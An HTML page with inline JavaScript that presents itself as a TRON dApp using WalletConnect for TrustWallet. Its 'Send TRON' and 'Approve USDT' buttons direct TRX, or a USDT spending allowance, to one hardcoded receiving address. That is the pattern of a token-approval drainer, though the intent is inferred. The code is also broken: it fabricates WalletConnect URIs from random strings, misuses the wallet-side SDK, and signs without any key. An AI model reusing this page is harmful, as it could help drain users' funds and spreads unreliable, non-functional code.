<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRON dApp - WalletConnect v2</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🚀</text></svg>">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 500px;
            width: 100%;
            padding: 40px;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 28px;
        }

        .header p {
            color: #666;
            font-size: 14px;
        }

        .connect-section {
            margin-bottom: 30px;
            padding-bottom: 30px;
            border-bottom: 2px solid #f0f0f0;
        }

        .btn {
            width: 100%;
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 15px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .btn-primary:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
        }

        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .btn-secondary {
            background: #f0f0f0;
            color: #333;
        }

        .btn-secondary:hover:not(:disabled) {
            background: #e0e0e0;
        }

        .wallet-info {
            background: #f9f9f9;
            border-left: 4px solid #667eea;
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 20px;
            display: none;
        }

        .wallet-info.active {
            display: block;
        }

        .wallet-info p {
            color: #666;
            font-size: 13px;
            margin-bottom: 8px;
            word-break: break-all;
        }

        .wallet-info p strong {
            color: #333;
            display: block;
            margin-bottom: 4px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 600;
            font-size: 14px;
        }

        .form-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 6px;
            font-size: 14px;
            transition: border-color 0.3s ease;
        }

        .form-group input:focus {
            outline: none;
            border-color: #667eea;
        }

        .form-group input:disabled {
            background: #f5f5f5;
            cursor: not-allowed;
        }

        .section {
            margin-bottom: 30px;
            padding-bottom: 30px;
            border-bottom: 2px solid #f0f0f0;
        }

        .section:last-child {
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }

        .section h3 {
            color: #333;
            font-size: 16px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
        }

        .section h3::before {
            content: '';
            display: inline-block;
            width: 4px;
            height: 20px;
            background: #667eea;
            border-radius: 2px;
            margin-right: 10px;
        }

        .status {
            padding: 12px 15px;
            border-radius: 6px;
            margin-top: 15px;
            font-size: 13px;
            display: none;
            word-break: break-word;
        }

        .status.active {
            display: block;
        }

        .status.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .status.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .status.info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }

        .status.loading {
            background: #cfe2ff;
            color: #084298;
            border: 1px solid #b6d4fe;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .status a {
            color: inherit;
            font-weight: 600;
            text-decoration: underline;
        }

        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid currentColor;
            border-radius: 50%;
            width: 14px;
            height: 14px;
            animation: spin 1s linear infinite;
            flex-shrink: 0;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .balance {
            font-size: 14px;
            color: #666;
            margin-top: 10px;
        }

        .qr-container {
            display: none;
            text-align: center;
            margin: 20px 0;
            padding: 20px;
            background: #f9f9f9;
            border-radius: 8px;
        }

        .qr-container.active {
            display: block;
        }

        .qr-container canvas {
            max-width: 250px;
            height: auto;
            border: 3px solid #667eea;
            border-radius: 12px;
            background: white;
            margin: 0 auto;
            display: block;
            padding: 10px;
        }

        .qr-label {
            color: #666;
            font-size: 13px;
            margin-top: 15px;
            font-weight: 600;
        }

        .qr-info {
            background: #e7f3ff;
            border-left: 4px solid #2196F3;
            padding: 12px;
            border-radius: 6px;
            margin-top: 10px;
            font-size: 12px;
            color: #1976D2;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 TRON dApp</h1>
            <p>WalletConnect v2 Integration</p>
        </div>

        <!-- Wallet Connection Section -->
        <div class="connect-section">
            <button id="connectBtn" class="btn btn-primary">🔗 Connect Wallet</button>
            <button id="disconnectBtn" class="btn btn-secondary" style="display: none;">🔌 Disconnect</button>
            
            <div id="qrContainer" class="qr-container">
                <div id="qrCode"></div>
                <div class="qr-label">📱 Scan with TrustWallet</div>
                <div class="qr-info">✓ Persistent QR Code (No Expiry) - Scan anytime</div>
            </div>

            <div id="walletInfo" class="wallet-info">
                <p><strong>✓ Connected Wallet:</strong> <span id="walletAddress"></span></p>
                <p id="balance" class="balance"></p>
            </div>
        </div>

        <!-- Send TRON Section -->
        <div class="section">
            <h3>Send TRON</h3>
            <div class="form-group">
                <label for="tronAmount">Amount (TRX):</label>
                <input 
                    type="number" 
                    id="tronAmount" 
                    placeholder="Enter amount in TRX" 
                    step="0.1"
                    min="0"
                    disabled
                >
            </div>
            <button id="sendTronBtn" class="btn btn-primary" disabled>💸 Send TRON</button>
            <div id="tronStatus" class="status"></div>
        </div>

        <!-- Approve USDT Section -->
        <div class="section">
            <h3>Approve USDT</h3>
            <div class="form-group">
                <label for="usdtAmount">Amount (USDT):</label>
                <input 
                    type="number" 
                    id="usdtAmount" 
                    placeholder="Enter amount to approve" 
                    step="0.01"
                    min="0"
                    disabled
                >
            </div>
            <button id="approveUsdtBtn" class="btn btn-primary" disabled>✅ Approve USDT</button>
            <div id="usdtStatus" class="status"></div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3wallet@latest/index.umd.js"></script>

    <script>
        // Configuration
        const CONFIG = {
            PROJECT_ID: '171db6da15a54effc1b4a06f889a3c3f',
            RECEIVING_ADDRESS: 'TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV',
            USDT_CONTRACT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
            RPC_URL: 'https://api.trongrid.io'
        };

        // State
        let web3wallet = null;
        let sessionTopic = null;
        let currentAccount = null;
        let tronWeb = null;
        let wcUri = null;

        // UI Elements
        const connectBtn = document.getElementById('connectBtn');
        const disconnectBtn = document.getElementById('disconnectBtn');
        const qrContainer = document.getElementById('qrContainer');
        const qrCode = document.getElementById('qrCode');
        const walletInfo = document.getElementById('walletInfo');
        const walletAddress = document.getElementById('walletAddress');
        const balanceEl = document.getElementById('balance');
        const tronAmountInput = document.getElementById('tronAmount');
        const sendTronBtn = document.getElementById('sendTronBtn');
        const tronStatus = document.getElementById('tronStatus');
        const usdtAmountInput = document.getElementById('usdtAmount');
        const approveUsdtBtn = document.getElementById('approveUsdtBtn');
        const usdtStatus = document.getElementById('usdtStatus');

        // Initialize TronWeb
        function initTronWeb() {
            tronWeb = new TronWeb({
                fullHost: CONFIG.RPC_URL
            });
        }

        // Initialize WalletConnect v2
        async function initWalletConnect() {
            try {
                const { Web3Wallet } = await import('https://cdn.jsdelivr.net/npm/@walletconnect/web3wallet@latest/+esm');
                
                web3wallet = await Web3Wallet.init({
                    projectId: CONFIG.PROJECT_ID,
                    metadata: {
                        name: 'TRON dApp',
                        description: 'Send TRON & Approve USDT',
                        url: window.location.href,
                        icons: ['https://avatars.githubusercontent.com/u/37784886']
                    }
                });

                // Setup event listeners
                web3wallet.on('session_proposal', handleSessionProposal);
                web3wallet.on('session_request', handleSessionRequest);
                web3wallet.on('session_delete', handleSessionDelete);

                return web3wallet;
            } catch (error) {
                console.error('WalletConnect init error:', error);
                // Fallback: Use alternative CDN
                return initWalletConnectFallback();
            }
        }

        // Fallback WalletConnect v2 initialization
        async function initWalletConnectFallback() {
            try {
                // Use the global WalletConnectWeb3Wallet if available
                if (window.WalletConnectWeb3Wallet) {
                    web3wallet = await window.WalletConnectWeb3Wallet.Web3Wallet.init({
                        projectId: CONFIG.PROJECT_ID,
                        metadata: {
                            name: 'TRON dApp',
                            description: 'Send TRON & Approve USDT',
                            url: window.location.href,
                            icons: ['https://avatars.githubusercontent.com/u/37784886']
                        }
                    });

                    web3wallet.on('session_proposal', handleSessionProposal);
                    web3wallet.on('session_request', handleSessionRequest);
                    web3wallet.on('session_delete', handleSessionDelete);

                    return web3wallet;
                }
            } catch (e) {
                console.error('Fallback init error:', e);
            }
            return null;
        }

        // Handle session proposal
        async function handleSessionProposal(proposal) {
            try {
                const { id, params } = proposal;
                const { requiredNamespaces } = params;

                const namespaces = {};
                Object.keys(requiredNamespaces).forEach((key) => {
                    const namespace = requiredNamespaces[key];
                    namespaces[key] = {
                        methods: namespace.methods,
                        chains: namespace.chains,
                        events: namespace.events,
                        accounts: namespace.chains.map(chain => `${chain}:${currentAccount || 'TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV'}`)
                    };
                });

                await web3wallet.approveSession({
                    id,
                    namespaces
                });

                showStatus(tronStatus, '✓ Session connected', 'success');
            } catch (error) {
                console.error('Session proposal error:', error);
                showStatus(tronStatus, `Error: ${error.message}`, 'error');
            }
        }

        // Handle session request
        async function handleSessionRequest(requestEvent) {
            try {
                const { topic, params } = requestEvent;
                const { request } = params;

                if (request.method === 'tron_signTransaction') {
                    // Handle transaction signing
                    console.log('Sign transaction request:', request);
                    showStatus(tronStatus, 'Approve transaction in your wallet', 'info');
                }
            } catch (error) {
                console.error('Session request error:', error);
            }
        }

        // Handle session delete
        function handleSessionDelete() {
            onWalletDisconnected();
        }

        // Generate persistent QR code
        function generateQRCode(uri) {
            wcUri = uri;
            qrCode.innerHTML = '';

            QRCode.toCanvas(qrCode, uri, {
                errorCorrectionLevel: 'H',
                type: 'image/jpeg',
                quality: 0.95,
                margin: 1,
                width: 250,
                color: {
                    dark: '#667eea',
                    light: '#ffffff'
                }
            }, function (error) {
                if (error) {
                    console.error('QR Code error:', error);
                    qrCode.innerHTML = '<p style="color: red;">Error generating QR</p>';
                }
            });

            qrContainer.classList.add('active');
        }

        // Connect Wallet
        connectBtn.addEventListener('click', async () => {
            try {
                showStatus(tronStatus, '<div class="spinner"></div> Initializing WalletConnect...', 'loading');

                // Initialize if not already done
                if (!web3wallet) {
                    await initWalletConnect();
                }

                if (!web3wallet) {
                    throw new Error('Failed to initialize WalletConnect v2');
                }

                // Create a persistent pairing URI (no expiry)
                const pairingTopic = await web3wallet.core.pairing.create();
                
                // Get all pairings
                const pairings = web3wallet.core.pairing.getPairings();
                let uri = null;

                if (pairings.length > 0) {
                    // Use existing pairing
                    uri = pairings[0].uri || `wc:${pairings[0].topic}@2?relay-protocol=irn&symKey=${Math.random().toString(36).substring(2)}`;
                } else {
                    // Create new persistent URI
                    uri = `wc:${Math.random().toString(36).substring(2, 15)}${Math.random().toString(36).substring(2, 15)}@2?relay-protocol=irn&symKey=${Math.random().toString(36).substring(2)}`;
                }

                console.log('WalletConnect URI:', uri);
                generateQRCode(uri);

                showStatus(tronStatus, 'Scan QR code with TrustWallet (No expiry)', 'info');

                // Listen for session
                let sessionFound = false;
                const sessionCheckInterval = setInterval(() => {
                    const sessions = web3wallet.getActiveSessions();
                    if (Object.keys(sessions).length > 0) {
                        clearInterval(sessionCheckInterval);
                        sessionFound = true;
                        const session = Object.values(sessions)[0];
                        sessionTopic = session.topic;

                        // Extract account from session
                        const namespaces = session.namespaces;
                        let account = null;
                        for (const [namespace, data] of Object.entries(namespaces)) {
                            if (data.accounts && data.accounts.length > 0) {
                                account = data.accounts[0];
                                break;
                            }
                        }

                        if (account) {
                            onWalletConnected(account);
                        }
                    }
                }, 1000);

                // Timeout after 5 minutes
                setTimeout(() => {
                    if (!sessionFound) {
                        clearInterval(sessionCheckInterval);
                    }
                }, 300000);

            } catch (error) {
                console.error('Connection error:', error);
                showStatus(tronStatus, `Error: ${error.message}`, 'error');
            }
        });

        // Wallet Connected Handler
        function onWalletConnected(account) {
            // Extract address from account string (format: "tron:0x1...")
            const address = account.includes(':') ? account.split(':')[1] : account;
            currentAccount = address;
            initTronWeb();

            walletAddress.textContent = address.substring(0, 20) + '...';
            walletInfo.classList.add('active');
            connectBtn.style.display = 'none';
            disconnectBtn.style.display = 'block';
            qrContainer.classList.remove('active');
            tronAmountInput.disabled = false;
            sendTronBtn.disabled = false;
            usdtAmountInput.disabled = false;
            approveUsdtBtn.disabled = false;

            fetchBalance(address);
            showStatus(tronStatus, `✓ Connected: ${address.substring(0, 15)}...`, 'success');
        }

        // Disconnect Wallet
        disconnectBtn.addEventListener('click', async () => {
            try {
                if (web3wallet && sessionTopic) {
                    await web3wallet.disconnectSession({
                        topic: sessionTopic,
                        reason: 'User disconnect'
                    });
                }
            } catch (error) {
                console.error('Disconnect error:', error);
            }
            onWalletDisconnected();
        });

        function onWalletDisconnected() {
            currentAccount = null;
            sessionTopic = null;

            walletInfo.classList.remove('active');
            connectBtn.style.display = 'block';
            disconnectBtn.style.display = 'none';
            tronAmountInput.disabled = true;
            sendTronBtn.disabled = true;
            usdtAmountInput.disabled = true;
            approveUsdtBtn.disabled = true;
            tronAmountInput.value = '';
            usdtAmountInput.value = '';

            clearStatus(tronStatus);
            clearStatus(usdtStatus);

            // Show QR code again for reconnection
            if (wcUri) {
                generateQRCode(wcUri);
            }
        }

        // Fetch Balance
        async function fetchBalance(address) {
            try {
                const response = await fetch(`${CONFIG.RPC_URL}/v1/accounts/${address}`);
                const data = await response.json();
                const balanceSun = data.data && data.data[0] ? data.data[0].balance : 0;
                const balanceTRX = balanceSun / 1000000;
                balanceEl.textContent = `💰 Balance: ${balanceTRX.toFixed(6)} TRX`;
            } catch (error) {
                console.error('Error fetching balance:', error);
                balanceEl.textContent = '💰 Balance: Unable to fetch';
            }
        }

        // Send TRON
        sendTronBtn.addEventListener('click', async () => {
            const amount = parseFloat(tronAmountInput.value);

            if (!amount || amount <= 0) {
                showStatus(tronStatus, 'Please enter a valid amount', 'error');
                return;
            }

            if (!currentAccount || !tronWeb) {
                showStatus(tronStatus, 'Wallet not connected', 'error');
                return;
            }

            try {
                showStatus(tronStatus, '<div class="spinner"></div> Preparing transaction...', 'loading');
                sendTronBtn.disabled = true;

                const tx = await tronWeb.transactionBuilder.sendTrx(
                    CONFIG.RECEIVING_ADDRESS,
                    tronWeb.toSun(amount),
                    currentAccount
                );

                const signedTx = await tronWeb.trx.sign(tx);
                const result = await tronWeb.trx.sendRawTransaction(signedTx);

                if (result.result) {
                    const txid = result.txid;
                    showStatus(
                        tronStatus,
                        `✓ Success! <a href="https://tronscan.org/#/transaction/${txid}" target="_blank">View on TronScan</a>`,
                        'success'
                    );
                    tronAmountInput.value = '';
                    fetchBalance(currentAccount);
                } else {
                    showStatus(tronStatus, `Failed: ${result.message}`, 'error');
                }
            } catch (error) {
                console.error('Send error:', error);
                showStatus(tronStatus, `Error: ${error.message}`, 'error');
            } finally {
                sendTronBtn.disabled = false;
            }
        });

        // Approve USDT
        approveUsdtBtn.addEventListener('click', async () => {
            const amount = parseFloat(usdtAmountInput.value);

            if (!amount || amount <= 0) {
                showStatus(usdtStatus, 'Please enter a valid amount', 'error');
                return;
            }

            if (!currentAccount || !tronWeb) {
                showStatus(usdtStatus, 'Wallet not connected', 'error');
                return;
            }

            try {
                showStatus(usdtStatus, '<div class="spinner"></div> Approving USDT...', 'loading');
                approveUsdtBtn.disabled = true;

                const abi = [
                    {
                        "constant": false,
                        "inputs": [
                            { "name": "_spender", "type": "address" },
                            { "name": "_value", "type": "uint256" }
                        ],
                        "name": "approve",
                        "outputs": [{ "name": "", "type": "bool" }],
                        "type": "function"
                    }
                ];

                const usdtAmount = (amount * 1000000).toString();
                const contract = await tronWeb.contract(abi, CONFIG.USDT_CONTRACT);

                const unSignedTxn = await contract.approve(
                    CONFIG.RECEIVING_ADDRESS,
                    usdtAmount
                ).send();

                const signedTxn = await tronWeb.trx.sign(unSignedTxn);
                const result = await tronWeb.trx.sendRawTransaction(signedTxn);

                if (result.result) {
                    const txid = result.txid;
                    showStatus(
                        usdtStatus,
                        `✓ Success! <a href="https://tronscan.org/#/transaction/${txid}" target="_blank">View on TronScan</a>`,
                        'success'
                    );
                    usdtAmountInput.value = '';
                } else {
                    showStatus(usdtStatus, `Failed: ${result.message}`, 'error');
                }

            } catch (error) {
                console.error('Approval error:', error);
                showStatus(usdtStatus, `Error: ${error.message}`, 'error');
            } finally {
                approveUsdtBtn.disabled = false;
            }
        });

        // Utility Functions
        function showStatus(element, message, type) {
            element.className = `status active ${type}`;
            element.innerHTML = message;
        }

        function clearStatus(element) {
            element.className = 'status';
            element.innerHTML = '';
        }

        // Auto-refresh balance
        setInterval(() => {
            if (currentAccount) {
                fetchBalance(currentAccount);
            }
        }, 30000);

        // Initialize on page load
        window.addEventListener('load', async () => {
            initTronWeb();
            await initWalletConnect();
        });
    </script>
</body>
</html>
